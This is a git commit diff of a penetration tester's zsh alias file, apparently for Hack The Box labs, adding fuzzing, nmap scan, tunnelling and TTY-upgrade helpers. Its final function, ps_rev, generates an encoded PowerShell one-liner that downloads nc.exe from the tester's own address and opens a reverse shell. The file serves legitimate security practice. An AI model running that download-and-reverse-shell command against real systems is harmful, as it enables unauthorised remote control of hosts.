c49d8c4a2df6f24046cd11f0c9363867cb65bbd9
scmanjarrez <serchiman@gmail.com>
2024-10-16 19:41:43 +0200

    Added more commands

--- aliases.zsh
+++ aliases.zsh
@@ -7,11 +7,12 @@ ls_pwd() {
   echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"
 }
 
-mkdir_cd() {
+mkcd() {
   mkdir $1 && cd $_
 }
 
-alias www="list_ips && ls_pwd && sudo python3 -m http.server 80"
+alias www="list_ips && ls_pwd && python3 -m http.server 80"
+alias wwwp="list_ips && ls_pwd && python3 -m http.server"
 alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
 
 # Hashcracking
@@ -65,6 +66,9 @@ py_tty_upgrade () {
 py3_tty_upgrade () {
   echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
 }
+raw_nc () {
+  stty raw -echo; (stty size; cat) | nc -lvnp "$1"
+}
 alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
 alias tty_fix="stty raw -echo; fg; reset"
 alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
@@ -73,4 +77,57 @@ alias tty_confpy3="(stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;
 alias tty_full2="tty_confpy2; tty_fix"
 alias tty_full="tty_confpy3; tty_fix"
 
+ffufd() {
+  hostn=$1
+  shift
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.aspx,.jsp,.html,.js -u http://"$hostn"/FUZZ $@
+}
+
+ffufv() {
+  hostn=$1
+  hostnp=${1%%:*}
+  shift
+  ffuf -w ~/htb/tools/fuzz4bounty/DNS/subdomains.txt -u http://"$hostn" -H "Host: FUZZ.$hostnp" $@
+}
+
+nmaps() {
+  hostn=$1
+  shift
+  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v $hostn -p- $@
+}
+
+nmapsf() {
+  f=$1
+  shift
+  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v -iL $f -p- $@
+}
+
+nmapp() {
+  hostn=$1
+  shift
+  sudo nmap -sS -Pn -n -T4 --min-parallelism 1000 --min-rate 5000 -v $hostn -sC -sV -p $@
+}
+
+nmapu() {
+  hostn=$1
+  shift
+  sudo nmap -sU -Pn -n -T4 --min-parallelism 100 -v $hostn $@
+}
+
+setup_ligolo() {
+  sudo ip tuntap add user kali mode tun ligolo
+  sudo ip link set ligolo up
+  sudo ip route add 240.0.0.1/32 dev ligolo
+}
+
+cve() {
+  echo -n "[CVE-$1](https://nvd.nist.gov/vuln/detail/CVE-$1)" | xclip -sel prim
+}
 export PATH=~/zsh-aliases/shells/:$PATH
+ps_rev () {
+  interface="$(ip tuntap show | grep tun0 | cut -d : -f1 | head -n 1)"
+  ip="$(ip a s "${interface}" 2>/dev/null | grep -o -P '(?<=inet )[0-9]{1,3}(\.[0-9]{1,3}){3}')"
+  lport=${1:-9000}
+  www=${2:-9090}
+  printf '%s' "New-Item -Path c:\temp -ItemType Directory -Force; iwr $ip:$www/nc64.exe -o c:\temp\nc.exe; c:\temp\nc.exe $ip $lport -e powershell" | iconv -t UTF-16LE | base64 -w 0
+}
